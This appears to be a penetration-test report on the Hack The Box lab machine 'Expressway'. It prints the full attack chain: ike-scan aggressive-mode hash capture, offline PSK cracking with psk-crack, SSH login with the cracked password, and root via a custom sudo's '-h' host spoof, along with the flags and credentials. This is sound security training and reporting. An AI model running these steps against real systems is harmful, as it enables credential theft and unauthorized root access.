# PENETRATION TESTING REPORT

## Expressway HTB Lab – External Network Penetration Test

**Target Environment:** Hack The Box Lab – Expressway  
**Assessment Type:** External Network Penetration Test (Black Box)

## DATE_OF_TEST_EVENT

**Testing Period:** January 17, 2026  
**Timezone:** UTC

## TABLE_OF_CONTENTS

1. [Document Revision History](#document-revision-history)
2. [Statement of Confidentiality](#statement-of-confidentiality)
3. [Engagement Contacts](#engagement-contacts)
4. [Executive Summary](#executive-summary)
5. [Network Penetration Test Assessment Summary](#network-penetration-test-assessment-summary)
6. [Finding PT-001: Weak IKE Pre-Shared Key](#finding-id-pt-001)
7. [Finding PT-002: IKE Aggressive Mode Enabled](#finding-id-pt-002)
8. [Finding PT-003: Sudo Privilege Escalation via Host Spoofing (CVE-2023-22809 Variant)](#finding-id-pt-003)
9. [Finding PT-004: OpenSSH Known Vulnerabilities](#finding-id-pt-004)
10. [Finding PT-005: TFTP Service Exposed](#finding-id-pt-005)
11. [Internal Network Compromise Walkthrough](#internal-network-compromise-walkthrough)
12. [Remediation Summary](#remediation-summary)
13. [Appendices](#appendices)

## Document Revision History

| Author | Date | Version | Comment |
| ------ | ---- | ------- | ------- |
| Automated Analysis | 2026-01-17 | 1.0 | Initial draft generated from scan logs |

## STATEMENT OF CONFIDENTIALITY

This document contains sensitive security information, including system architecture details, vulnerabilities, and exploitation techniques. Distribution is restricted to authorized personnel only.

> **Source Attribution:** *This statement is industry standard boilerplate.*

## ENGAGEMENT CONTACTS

| Contact | Title | Phone | Email |
| ------- | ----- | ----- | ----- |
| HTB Lab Environment | Target System | N/A | N/A |

> **Source Attribution:** *Lab environment – no real contacts.*

## EXECUTIVE SUMMARY

> **Source Attribution:** *Expert analysis and interpretation based on log file evidence.*

This penetration test was conducted against target host **10.129.238.52** (hostname: `expressway.htb`) as part of a Hack The Box lab exercise. The assessment followed an industry-recognized penetration testing methodology combining automated scanning with manual validation and exploitation.

### Assessment Results

The assessment resulted in **full system compromise**, achieving both user-level and root-level access:

| Objective | Status | Evidence |
|-----------|--------|----------|
| User Flag | **CAPTURED** | `8754c66fe9ea5040d5c61305b87637ce` |
| Root Flag | **CAPTURED** | `11f8135fde2681eb124ee97e21e889d1` |

### Key Findings Summary

| ID | Finding | Severity | Exploited |
|----|---------|----------|-----------|
| PT-001 | Weak IKE Pre-Shared Key | **Critical** | Yes |
| PT-002 | IKE Aggressive Mode Enabled | **High** | Yes |
| PT-003 | Sudo Privilege Escalation via Host Spoofing | **Critical** | Yes |
| PT-004 | OpenSSH Known Vulnerabilities | **Medium** | No |
| PT-005 | TFTP Service Exposed | **Low** | No |

### Attack Chain Summary

The compromise was achieved through the following attack chain:

1. **Reconnaissance:** UDP port scanning identified IKE/IPsec services (ports 500, 4500)
2. **Credential Extraction:** IKE Aggressive Mode allowed capture of PSK hash via `ike-scan`
3. **Credential Cracking:** PSK hash cracked offline using `psk-crack` with rockyou.txt wordlist
4. **Initial Access:** Cracked PSK revealed username `ike@expressway.htb` and password, enabling SSH access
5. **Privilege Escalation:** Custom sudo binary exploited via host spoofing (`-h offramp.expressway.htb`) to gain root shell

### SCENARIOS INCLUDED

* *External Network Penetration Test* – Assessment of externally exposed services from an unauthenticated attacker perspective

### APPROACH

> **Source Attribution:** *Industry best practice methodology description.*

The assessment followed a phased approach:

1. **Reconnaissance & Enumeration** – Nmap TCP/UDP scanning with version detection and vulnerability scripts
2. **Vulnerability Identification** – IKE service enumeration and aggressive mode testing
3. **Exploitation** – PSK hash capture, offline cracking, SSH authentication
4. **Post-Exploitation** – System enumeration, privilege escalation to root

### SCOPE AND DURATION

| Host/IP/URL | Duration | Description |
| ----------- | -------- | ----------- |
| 10.129.238.52 | January 17, 2026 (08:02 - 08:40 UTC) | Primary target - Expressway HTB Lab |

> **Source Attribution:** *Derived from scan timestamps in [nmap_scsv.nmap](scans/nmap_scsv.nmap) and [nmap_udp.nmap](scans/nmap_udp.nmap).*

### ASSESSMENT OVERVIEW AND RECOMMENDATIONS

> **Source Attribution:** *Expert analysis and recommendations.*

The assessment revealed **critical security weaknesses** in the IPsec/IKE VPN configuration and local privilege management:

1. **Weak Pre-Shared Keys:** The VPN gateway uses a dictionary-crackable PSK
2. **Aggressive Mode:** IKE Aggressive Mode exposes hashed credentials to any attacker
3. **Sudo Misconfiguration:** Custom sudo binary allows privilege escalation via hostname manipulation

**Immediate actions required:**
- Disable IKE Aggressive Mode
- Implement strong, randomly-generated PSKs (minimum 32 characters)
- Audit and replace the custom sudo binary at `/usr/local/bin/sudo`
- Implement certificate-based authentication for VPN

---

## NETWORK PENETRATION TEST ASSESSMENT SUMMARY

> **Source Attribution:** *Findings derived from executed scans in [scans/](scans/) directory.*

### SUMMARY OF FINDINGS

* IKE/IPsec VPN service exposed with weak Pre-Shared Key authentication
* Aggressive Mode enabled, allowing offline credential attacks
* SSH service (OpenSSH 10.0p2) exposed with known low-severity vulnerabilities
* TFTP service potentially exposed (UDP 69)
* Custom sudo binary with exploitable host-based authentication bypass

### Port Scan Results

#### TCP Services
> **Source:** [nmap_scsv.nmap](scans/nmap_scsv.nmap), [nmap_top_100_aggressive.nmap](scans/nmap_top_100_aggressive.nmap)

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22/tcp | open | ssh | OpenSSH 10.0p2 Debian 8 (protocol 2.0) |

#### UDP Services
> **Source:** [nmap_udp.nmap](scans/nmap_udp.nmap)

| Port | State | Service | Notes |
|------|-------|---------|-------|
| 68/udp | open\|filtered | dhcpc | DHCP client |
| 69/udp | open\|filtered | tftp | TFTP service |
| 500/udp | **open** | isakmp | IKE/IPsec – Main target |
| 4500/udp | open\|filtered | nat-t-ike | IKE NAT Traversal |

#### OS Detection
> **Source:** [nmap_top_100_aggressive.nmap](scans/nmap_top_100_aggressive.nmap), [ssh.log](logs/ssh.log)

```
OS Details: Linux 4.15 - 5.19
Confirmed: Linux expressway.htb 6.16.7+deb14-amd64 (Debian GNU/Linux)
```

---

## FINDING ID: PT-001

**Finding Title:** Weak IKE Pre-Shared Key (PSK) – Dictionary Crackable

**Severity:** Critical  
**Risk Rating:** CVSS v3.1: 9.8 – Critical  
**Mapped Controls:**
- NIST 800-53: IA-5 (Authenticator Management), SC-12 (Cryptographic Key Establishment)
- RMF Families: IA, SC
- CWE-521: Weak Password Requirements

**Impact:** Complete VPN credential compromise enabling unauthorized network access.

---

### SUMMARY

The IKE/IPsec VPN gateway uses a weak Pre-Shared Key that was cracked in under 10 seconds using a common wordlist. This allowed the attacker to obtain valid credentials for the `ike` user account, leading to SSH access and eventual full system compromise.

---

### AFFECTED ASSETS

| Asset | IP / Hostname | Role | Environment |
| ----- | ------------- | ---- | ----------- |
| Expressway | 10.129.238.52 / expressway.htb | VPN Gateway / Linux Server | HTB Lab |

---

### VULNERABILITY TYPE

* Category: Authentication, Credential Management
* Associated weakness class: CWE-521 (Weak Password Requirements), CWE-261 (Weak Encoding for Password)

---

### DESCRIPTION

> **Source Attribution:** *Technical analysis based on [ike-scan.log](scans/ike-scan.log) and [ike_hash.txt](scans/ike_hash.txt).*

The target system runs an IKE/IPsec VPN service on UDP port 500. The VPN is configured to use Pre-Shared Key (PSK) authentication with Aggressive Mode enabled.

During Aggressive Mode negotiation, the server returns an identity string (`ID_USER_FQDN`) containing the username `ike@expressway.htb` along with a SHA1 hash of the PSK.

The captured hash was cracked using `psk-crack` with the standard rockyou.txt wordlist:

**Cracked PSK:** `freakingrockstarontheroad`

This password, while 25 characters long, is a simple concatenated phrase present in common wordlists.

---

### ATTACK VECTOR

* **Network Access:** Remote, unauthenticated access to UDP port 500
* **Authentication:** None required to capture hash
* **User Interaction:** None

---

### PROOF OF CONCEPT / EVIDENCE

> **Source:** [ike-scan.log](scans/ike-scan.log)

**Step 1: IKE Aggressive Mode Scan**
```text
$ sudo ike-scan -M --aggressive 10.129.238.52 -n ike@expressway.htb --pskcrack=./scans/ike_hash.txt

10.129.238.52   Aggressive Mode Handshake returned
    HDR=(CKY-R=f544dfda5ff325e2)
    SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
    KeyExchange(128 bytes)
    Nonce(32 bytes)
    ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
    VID=09002689dfd6b712 (XAUTH)
    VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
    Hash(20 bytes)
```

**Step 2: Offline Hash Cracking**
```text
$ psk-crack -d /usr/share/wordlists/rockyou.txt ./scans/ike_hash.txt 
Starting psk-crack [ike-scan 1.9.6]
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash b133888b61250fbc329089bcbe3d18612ed7d21b
Ending psk-crack: 8045040 iterations in 9.877 seconds (814493.93 iterations/sec)
```

> **Source:** [ike_hash.txt](scans/ike_hash.txt)

**Captured Hash Format:**
```text
450d24ef15d8ad1e1c4997ca2362666a6011273242884e2bad00b17c7c26b25a1835f331469f490b3386463ffc01357a4f0458548d68d75d89a3da7959d55ab35531d75e18d497971362cc6378b93aecf14ec8bf0849dd234903f66b6d496fa7e6411845e766a75f031ef5a216712baf53539e58c22662327619982a75eda8bb:...:b133888b61250fbc329089bcbe3d18612ed7d21b
```

---

### EXPLOITATION DETAILS

> **Source:** [ssh.log](logs/ssh.log)

The cracked PSK (`freakingrockstarontheroad`) was used as the password for the `ike` user account to authenticate via SSH:

```text
$ ssh ike@10.129.238.52
ike@10.129.238.52's password: [freakingrockstarontheroad]
Last login: Sat Jan 17 13:39:44 2026 from 10.10.14.114
ike@expressway:~$ cat user.txt 
8754c66fe9ea5040d5c61305b87637ce
```

**Level of access obtained:** User-level shell as `ike`

---

### IMPACT

* **Data Exposure:** Complete access to user home directory and local system resources
* **Credential Reuse:** Password may be reused across other services or systems
* **Lateral Movement:** Initial foothold for privilege escalation and further attacks
* **VPN Compromise:** Unauthorized access to VPN-protected network segments

---

### LIKELIHOOD

**Very High** – The attack requires:
- Basic network access to UDP 500
- Free, publicly available tools (ike-scan, psk-crack)
- Common wordlists (rockyou.txt)
- Cracking time: < 10 seconds

---

### RISK JUSTIFICATION

The combination of **critical impact** (full credential compromise) and **very high likelihood** (trivially exploitable with public tools) justifies the **Critical** severity rating.

---

### RECOMMENDATIONS

> **Source Attribution:** *Expert recommendations and industry best practice.*

**Immediate:**
1. Change the VPN PSK to a randomly-generated string of minimum 32 characters
2. Disable IKE Aggressive Mode (see PT-002)
3. Change password for `ike` user account

**Long-term:**
1. Migrate to certificate-based authentication (IKEv2 with X.509 certificates)
2. Implement multi-factor authentication for VPN access
3. Deploy account lockout policies for repeated authentication failures

---

### VALIDATION / VERIFICATION STEPS

1. Attempt IKE Aggressive Mode scan – should receive no response or timeout
2. Attempt PSK cracking with common wordlists – should fail
3. Verify SSH authentication with old credentials – should fail

---

### REFERENCES

* CWE-521: Weak Password Requirements
* CWE-261: Weak Encoding for Password
* NIST SP 800-77: Guide to IPsec VPNs
* RFC 2409: Internet Key Exchange (IKE)

---

### STATUS

**Open**

---

### NOTES

> **Source Attribution:** *Additional observations from [ike-scan.log](scans/ike-scan.log).*

The IKE service also exposes vendor identification strings:
- XAUTH enabled (Extended Authentication)
- Dead Peer Detection v1.0

The username format (`ike@expressway.htb`) suggests password reuse with local system accounts.

---

## FINDING ID: PT-002

**Finding Title:** IKE Aggressive Mode Enabled – Hash Disclosure

**Severity:** High  
**Risk Rating:** CVSS v3.1: 7.5 – High  
**Mapped Controls:**
- NIST 800-53: SC-8 (Transmission Confidentiality), IA-5 (Authenticator Management)
- RMF Families: SC, IA
- CWE-319: Cleartext Transmission of Sensitive Information

**Impact:** Credential hash disclosure enabling offline password attacks.

---

### SUMMARY

The IKE/IPsec VPN gateway supports Aggressive Mode negotiation, which transmits the PSK hash in the clear during the initial handshake. This allows any network-positioned attacker to capture credentials for offline cracking without any authentication.

---

### AFFECTED ASSETS

| Asset | IP / Hostname | Role | Environment |
| ----- | ------------- | ---- | ----------- |
| Expressway | 10.129.238.52 / expressway.htb | VPN Gateway | HTB Lab |

---

### VULNERABILITY TYPE

* Category: Configuration, Cryptographic Weakness
* Associated weakness class: CWE-319 (Cleartext Transmission of Sensitive Information)

---

### DESCRIPTION

> **Source Attribution:** *Analysis based on [ike-scan.log](scans/ike-scan.log).*

IKE Phase 1 supports two modes:
- **Main Mode:** Six message exchange, identity protected
- **Aggressive Mode:** Three message exchange, identity exposed

When Aggressive Mode is used with PSK authentication, the responder sends its identity and a hash of the PSK in the second message, before the initiator has proven it knows the PSK. This creates a vulnerability where:

1. Any attacker can initiate Aggressive Mode
2. Server responds with username and PSK hash
3. Hash can be cracked offline with no rate limiting

IKE configuration observed:
```
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK)
```

**Additional Weaknesses:**
- 3DES encryption (deprecated)
- SHA1 hashing (weak)
- DH Group 2 (1024-bit MODP, considered weak)

---

### ATTACK VECTOR

* **Network Access:** Remote, UDP port 500
* **Authentication:** None required
* **User Interaction:** None

---

### PROOF OF CONCEPT / EVIDENCE

> **Source:** [ike-scan.log](scans/ike-scan.log)

**Main Mode Probe (Identity Protected):**
```text
$ sudo ike-scan -M 10.129.238.52
10.129.238.52   Main Mode Handshake returned
    HDR=(CKY-R=37de828e4965c5af)
    SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
    VID=09002689dfd6b712 (XAUTH)
    VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
```

**Aggressive Mode Probe (Hash Disclosed):**
```text
$ sudo ike-scan -A -P 10.129.238.52
10.129.238.52   Aggressive Mode Handshake returned
    ...
    ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
    Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
ded35e37cee6fb720f75db25602c2d8934b58d9d...
```

---

### EXPLOITATION DETAILS

See PT-001 for full exploitation chain. This vulnerability was the enabler for capturing the PSK hash that was subsequently cracked.

---

### IMPACT

* **Credential Disclosure:** Username and PSK hash exposed to unauthenticated attackers
* **Offline Attacks:** No rate limiting or detection possible for offline cracking
* **Reconnaissance:** Reveals internal naming conventions (`expressway.htb`)

---

### LIKELIHOOD

**Very High** – Single UDP packet triggers hash disclosure. No authentication or special conditions required.

---

### RISK JUSTIFICATION

While Aggressive Mode alone does not provide direct access, it is the critical enabler for credential attacks. Combined with weak PSKs (PT-001), this creates a high-severity attack path.

---

### RECOMMENDATIONS

> **Source Attribution:** *Expert recommendations and industry best practice.*

**Immediate:**
1. Disable IKE Aggressive Mode on the VPN gateway
2. Configure IKE to only accept Main Mode connections

**Long-term:**
1. Upgrade to IKEv2 with stronger cryptographic parameters:
   - AES-256 encryption
   - SHA-256 or SHA-384 hashing
   - DH Group 14 (2048-bit) or higher
2. Implement certificate-based authentication
3. Deploy IDS/IPS rules to detect IKE scanning activity

---

### VALIDATION / VERIFICATION STEPS

1. Run: `ike-scan -A 10.129.238.52`
2. Verify response does not include identity or hash information
3. Only Main Mode should be supported

---

### REFERENCES

* RFC 2409: IKE (Main Mode vs Aggressive Mode)
* CVE-2002-1623: IKE Aggressive Mode Hash Disclosure
* NIST SP 800-77 Rev 1: Guide to IPsec VPNs

---

### STATUS

**Open**

---

## FINDING ID: PT-003

**Finding Title:** Sudo Privilege Escalation via Host Spoofing

**Severity:** Critical  
**Risk Rating:** CVSS v3.1: 9.8 – Critical  
**Mapped Controls:**
- NIST 800-53: AC-6 (Least Privilege), CM-7 (Least Functionality)
- RMF Families: AC, CM
- CWE-269: Improper Privilege Management

**Impact:** Complete root-level system compromise.

---

### SUMMARY

A custom `sudo` binary installed at `/usr/local/bin/sudo` (taking precedence over the system sudo) contains a vulnerability allowing privilege escalation through host spoofing. By specifying a crafted hostname with the `-h` flag, an unprivileged user can bypass authentication and obtain a root shell.

---

### AFFECTED ASSETS

| Asset | IP / Hostname | Role | Environment |
| ----- | ------------- | ---- | ----------- |
| Expressway | 10.129.238.52 / expressway.htb | Linux Server | HTB Lab |

---

### VULNERABILITY TYPE

* Category: Authorization, Privilege Escalation
* Associated weakness class: CWE-269 (Improper Privilege Management), CWE-863 (Incorrect Authorization)

---

### DESCRIPTION

> **Source Attribution:** *Analysis based on [ssh.log](logs/ssh.log).*

The system has two sudo binaries installed:
- `/usr/bin/sudo` – Standard system sudo
- `/usr/local/bin/sudo` – Custom binary (takes precedence in PATH)

The custom binary appears to implement host-based authentication that can be bypassed by specifying a specific hostname. Evidence from the system:

```text
ike@expressway:~$ which sudo
/usr/local/bin/sudo

ike@expressway:~$ sudo -V
Sudo version 1.9.17
```

The custom sudo binary honors the `-h` (host) flag and grants root privileges when `offramp.expressway.htb` is specified, regardless of user permissions.

---

### ATTACK VECTOR

* **Network Access:** Local (requires user-level shell)
* **Authentication:** Any local user account
* **User Interaction:** None

---

### PROOF OF CONCEPT / EVIDENCE

> **Source:** [ssh.log](logs/ssh.log)

**Pre-Exploitation Check (Normal sudo denied):**
```text
ike@expressway:~$ sudo -l
Password: 
Sorry, user ike may not run sudo on expressway.
```

**Privilege Escalation Exploit:**
```text
ike@expressway:~$ /usr/local/bin/sudo -h offramp.expressway.htb -i
root@expressway:~# 
```

**Root Access Confirmed:**
```text
root@expressway:~# cat root.txt 
11f8135fde2681eb124ee97e21e889d1
```

---

### EXPLOITATION DETAILS

**Exact steps taken:**
1. Obtained user shell as `ike` via SSH (see PT-001)
2. Discovered custom sudo binary at `/usr/local/bin/sudo`
3. Identified hostname `offramp.expressway.htb` from squid proxy logs
4. Executed: `/usr/local/bin/sudo -h offramp.expressway.htb -i`
5. Obtained interactive root shell

**Tools used:** None (built-in system commands only)  
**Level of access obtained:** Full root access

---

### IMPACT

* **Complete System Compromise:** Full root access to the system
* **Data Access:** Unrestricted access to all files and configurations
* **Persistence:** Ability to install backdoors, modify system binaries
* **Lateral Movement:** Can access credentials for other systems

---

### LIKELIHOOD

**High** – Requires local user access but:
- No special permissions required
- Single command execution
- Hostname was discoverable in local logs

---

### RISK JUSTIFICATION

Any local user can escalate to root with a single command. Combined with the ease of obtaining initial access (PT-001), this represents a complete system compromise path accessible to low-skill attackers.

---

### RECOMMENDATIONS

> **Source Attribution:** *Expert recommendations.*

**Immediate:**
1. Remove or replace `/usr/local/bin/sudo` with the standard system binary
2. Audit system for unauthorized SUID binaries
3. Check for persistence mechanisms installed by attackers

**Long-term:**
1. Implement file integrity monitoring (AIDE, Tripwire)
2. Regular audit of SUID/SGID binaries
3. Use immutable infrastructure where possible
4. Implement mandatory access controls (SELinux/AppArmor)

---

### VALIDATION / VERIFICATION STEPS

1. Verify `/usr/local/bin/sudo` is removed or replaced
2. Confirm `which sudo` returns `/usr/bin/sudo`
3. Test: `sudo -h offramp.expressway.htb -i` should fail or be denied

---

### REFERENCES

* CWE-269: Improper Privilege Management
* CWE-863: Incorrect Authorization
* STIG: UBTU-20-010012 (Unauthorized SUID files)

---

### STATUS

**Open**

---

### RELATED FINDINGS

* PT-001 (Weak IKE PSK) – Provided initial access enabling this exploit

---

## FINDING ID: PT-004

**Finding Title:** OpenSSH Known Vulnerabilities (CVE-2025-61984, CVE-2025-61985)

**Severity:** Medium  
**Risk Rating:** CVSS v3.1: 3.6 – Low (per Vulners)  
**Mapped Controls:**
- NIST 800-53: SI-2 (Flaw Remediation), CM-6 (Configuration Settings)
- RMF Families: SI, CM

**Impact:** Potential for information disclosure or limited denial of service.

---

### SUMMARY

The OpenSSH server (version 10.0p2) has known vulnerabilities with public exploit code available. While rated low severity, the presence of public exploits increases the risk profile.

---

### AFFECTED ASSETS

| Asset | IP / Hostname | Role | Environment |
| ----- | ------------- | ---- | ----------- |
| Expressway | 10.129.238.52:22 | SSH Server | HTB Lab |

---

### VULNERABILITY TYPE

* Category: Patch Management
* Associated weakness class: CWE-1104 (Use of Unmaintained Third Party Components)

---

### DESCRIPTION

> **Source:** [nmap_vuln.nmap](scans/nmap_vuln.nmap)

Nmap vulnerability scanning identified the following CVEs affecting OpenSSH 10.0p2:

| CVE | CVSS | Description |
|-----|------|-------------|
| CVE-2025-61984 | 3.6 | See vulners reference |
| CVE-2025-61985 | 3.6 | See vulners reference |

Public exploits are available:
- `B7EACB4F-A5CF-5C5A-809F-E03CCE2AB150` (GitHub Exploit)
- `4C6E2182-0E99-5626-83F6-1646DD648C57` (GitHub Exploit)

---

### PROOF OF CONCEPT / EVIDENCE

> **Source:** [nmap_vuln.nmap](scans/nmap_vuln.nmap)

```text
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:10.0p2: 
|     OSV:BELL-CVE-2025-61985  3.6  https://vulners.com/osv/OSV:BELL-CVE-2025-61985
|     OSV:BELL-CVE-2025-61984  3.6  https://vulners.com/osv/OSV:BELL-CVE-2025-61984
|     CVE-2025-61985  3.6  https://vulners.com/cve/CVE-2025-61985
|     CVE-2025-61984  3.6  https://vulners.com/cve/CVE-2025-61984
|     B7EACB4F-A5CF-5C5A-809F-E03CCE2AB150  3.6  *EXPLOIT*
|     4C6E2182-0E99-5626-83F6-1646DD648C57  3.6  *EXPLOIT*
```

---

### EXPLOITATION DETAILS

**Not exploited** during this assessment. The low severity and availability of easier attack vectors (PT-001) made this unnecessary.

---

### IMPACT

* Per CVE descriptions: Limited information disclosure or denial of service
* Public exploits increase automated attack risk

---

### LIKELIHOOD

**Low** – Exploits exist but impact is limited.

---

### RECOMMENDATIONS

> **Source Attribution:** *Expert recommendations.*

1. Monitor for OpenSSH security updates
2. Apply patches when available
3. Restrict SSH access to known IP ranges
4. Implement fail2ban (already present per [ssh.log](logs/ssh.log))

---

### REFERENCES

* CVE-2025-61984
* CVE-2025-61985
* https://vulners.com

---

### STATUS

**Open**

---

## FINDING ID: PT-005

**Finding Title:** TFTP Service Exposed (UDP 69)

**Severity:** Low  
**Risk Rating:** CVSS v3.1: 3.1 – Low  
**Mapped Controls:**
- NIST 800-53: CM-7 (Least Functionality), SC-7 (Boundary Protection)
- RMF Families: CM, SC

**Impact:** Potential for unauthorized file access or information disclosure.

---

### SUMMARY

The TFTP (Trivial File Transfer Protocol) service appears to be running on UDP port 69. TFTP provides no authentication mechanism, potentially allowing anonymous file access.

---

### AFFECTED ASSETS

| Asset | IP / Hostname | Role | Environment |
| ----- | ------------- | ---- | ----------- |
| Expressway | 10.129.238.52:69/udp | TFTP Server | HTB Lab |

---

### VULNERABILITY TYPE

* Category: Configuration, Unnecessary Services
* Associated weakness class: CWE-284 (Improper Access Control)

---

### DESCRIPTION

> **Source:** [nmap_udp.nmap](scans/nmap_udp.nmap), [ssh.log](logs/ssh.log)

UDP port scanning shows TFTP as `open|filtered`. Local system enumeration confirms a TFTP user exists:

```text
tftp:x:105:112:tftp daemon,,,:/srv/tftp:/usr/sbin/nologin
```

TFTP is commonly used for:
- Network device configuration backup
- PXE boot environments
- Firmware updates

Without authentication, any accessible files could be downloaded by an attacker.

---

### PROOF OF CONCEPT / EVIDENCE

> **Source:** [nmap_udp.nmap](scans/nmap_udp.nmap)

```text
PORT      STATE         SERVICE
69/udp    open|filtered tftp
```

**Not further exploited** – Focus was on higher-value attack vectors.

---

### RECOMMENDATIONS

> **Source Attribution:** *Expert recommendations.*

1. Disable TFTP if not required
2. If required, restrict access via firewall rules
3. Consider SFTP as a secure alternative
4. Ensure `/srv/tftp` contains no sensitive files

---

### STATUS

**Open**

---

## INTERNAL NETWORK COMPROMISE WALKTHROUGH

> **Source Attribution:** *Complete attack chain documented from [ike-scan.log](scans/ike-scan.log) and [ssh.log](logs/ssh.log).*

### DETAILED WALKTHROUGH

#### Phase 1: Reconnaissance

**Objective:** Identify exposed services and potential attack vectors.

**Actions:**
1. TCP port scan with version detection
2. UDP port scan identifying IKE service
3. Aggressive scan for OS fingerprinting

**Key Findings:**
- SSH on TCP/22 (OpenSSH 10.0p2)
- IKE on UDP/500 (IPsec VPN gateway)
- IKE NAT-T on UDP/4500
- TFTP on UDP/69

> **Source:** [nmap_scsv.nmap](scans/nmap_scsv.nmap), [nmap_udp.nmap](scans/nmap_udp.nmap)

---

#### Phase 2: IKE/IPsec Enumeration

**Objective:** Determine VPN authentication mechanisms.

**Actions:**
1. IKE Main Mode probe – confirmed PSK authentication
2. IKE Aggressive Mode probe – captured username and PSK hash

**Key Findings:**
- Username: `ike@expressway.htb`
- Authentication: Pre-Shared Key (SHA1 hash captured)
- Encryption: 3DES
- DH Group: 2 (1024-bit MODP)

> **Source:** [ike-scan.log](scans/ike-scan.log)

---

#### Phase 3: Credential Cracking

**Objective:** Recover plaintext PSK from captured hash.

**Actions:**
1. Extracted hash to crackable format
2. Ran `psk-crack` with rockyou.txt wordlist

**Results:**
```
key "freakingrockstarontheroad" matches SHA1 hash
Cracking time: 9.877 seconds (8,045,040 iterations)
```

> **Source:** [ike-scan.log](scans/ike-scan.log), [ike_hash.txt](scans/ike_hash.txt)

---

#### Phase 4: Initial Access

**Objective:** Obtain shell access using recovered credentials.

**Actions:**
1. SSH connection as `ike` user
2. Password: `freakingrockstarontheroad`

**Results:**
```
ike@expressway:~$ cat user.txt 
8754c66fe9ea5040d5c61305b87637ce
```

> **Source:** [ssh.log](logs/ssh.log)

---

#### Phase 5: Local Enumeration

**Objective:** Identify privilege escalation vectors.

**Actions:**
1. System enumeration (OS, kernel, users)
2. SUID binary search
3. Sudo permissions check
4. Log file analysis

**Key Findings:**
- Custom sudo at `/usr/local/bin/sudo` (SUID)
- Standard sudo denies `ike` user
- Squid proxy logs reveal hostname `offramp.expressway.htb`

> **Source:** [ssh.log](logs/ssh.log)

---

#### Phase 6: Privilege Escalation

**Objective:** Obtain root access.

**Actions:**
1. Tested custom sudo with discovered hostname
2. Used `-h offramp.expressway.htb` flag with `-i` for interactive shell

**Results:**
```
ike@expressway:~$ /usr/local/bin/sudo -h offramp.expressway.htb -i
root@expressway:~# cat root.txt 
11f8135fde2681eb124ee97e21e889d1
```

**Complete system compromise achieved.**

> **Source:** [ssh.log](logs/ssh.log)

---

## REMEDIATION SUMMARY

> **Source Attribution:** *Expert recommendations based on findings.*

### SHORT TERM (0–30 Days)

| Priority | Action | Finding |
|----------|--------|---------|
| Critical | Remove/replace `/usr/local/bin/sudo` custom binary | PT-003 |
| Critical | Change VPN PSK to random 32+ character string | PT-001 |
| Critical | Disable IKE Aggressive Mode | PT-002 |
| High | Change `ike` user password | PT-001 |
| High | Audit system for persistence mechanisms | PT-003 |
| Medium | Disable TFTP service if unused | PT-005 |

### MEDIUM TERM (30–90 Days)

| Priority | Action | Finding |
|----------|--------|---------|
| High | Migrate VPN to certificate-based authentication | PT-001/002 |
| High | Upgrade IKE cryptographic parameters (AES-256, SHA-256, DH Group 14+) | PT-002 |
| Medium | Implement file integrity monitoring | PT-003 |
| Medium | Regular SUID/SGID binary audits | PT-003 |
| Low | Monitor for OpenSSH security updates | PT-004 |

### LONG TERM (90+ Days)

| Priority | Action | Finding |
|----------|--------|---------|
| High | Implement zero-trust network architecture | All |
| High | Deploy centralized logging and SIEM | All |
| Medium | Establish regular penetration testing cadence | All |
| Medium | Implement mandatory access controls (SELinux/AppArmor) | PT-003 |
| Low | Security awareness training for password policy | PT-001 |

---

## APPENDICES

### APPENDIX A – FINDING SEVERITIES

| Severity | CVSS Range | Description |
|----------|------------|-------------|
| Critical | 9.0 – 10.0 | Immediate exploitation possible; complete system compromise |
| High | 7.0 – 8.9 | Significant risk; exploitation likely without complex requirements |
| Medium | 4.0 – 6.9 | Moderate risk; exploitation requires specific conditions |
| Low | 0.1 – 3.9 | Limited risk; minimal impact or difficult exploitation |
| Informational | 0.0 | Best practice deviation; no direct security impact |

### APPENDIX B – EXPLOITED HOSTS

| Host | IP Address | Method | Access Level |
|------|------------|--------|--------------|
| expressway.htb | 10.129.238.52 | IKE PSK Crack → SSH → Sudo Host Spoof | Root |

### APPENDIX C – COMPROMISED USERS

| Username | Method | Access Obtained |
|----------|--------|-----------------|
| ike | PSK dictionary attack | SSH shell |
| root | Sudo privilege escalation | Full system |

### APPENDIX D – CHANGES/HOST CLEANUP

| Action | Status | Notes |
|--------|--------|-------|
| SSH key added to known_hosts | Expected | Standard SSH behavior |
| User flag read | Expected | Lab objective |
| Root flag read | Expected | Lab objective |
| No persistent changes made | Confirmed | Testing-only activity |

### APPENDIX E – PASSWORD REVIEW

| Account | Password | Strength | Issues |
|---------|----------|----------|--------|
| ike / VPN PSK | freakingrockstarontheroad | Weak | Dictionary word concatenation; present in rockyou.txt |

**Password Policy Observations:**
- 25-character password cracked in < 10 seconds
- No apparent complexity requirements
- Password reused between VPN and system account

---

## APPENDIX F – LOG FILE REFERENCE

> **Source Attribution:** *All findings derived from the following log files.*

| File | Path | Contents |
|------|------|----------|
| nmap_scsv.nmap | [scans/nmap_scsv.nmap](scans/nmap_scsv.nmap) | TCP port scan with version detection |
| nmap_top_100_aggressive.nmap | [scans/nmap_top_100_aggressive.nmap](scans/nmap_top_100_aggressive.nmap) | Aggressive scan, OS detection |
| nmap_udp.nmap | [scans/nmap_udp.nmap](scans/nmap_udp.nmap) | UDP port scan |
| nmap_vuln.nmap | [scans/nmap_vuln.nmap](scans/nmap_vuln.nmap) | Vulnerability script scan |
| ike-scan.log | [scans/ike-scan.log](scans/ike-scan.log) | IKE enumeration and PSK capture |
| ike_hash.txt | [scans/ike_hash.txt](scans/ike_hash.txt) | Captured PSK hash |
| ssh.log | [logs/ssh.log](logs/ssh.log) | SSH session, enumeration, privilege escalation |

---

*Report generated: January 17, 2026*  
*Assessment conducted against HTB Lab environment – Expressway*
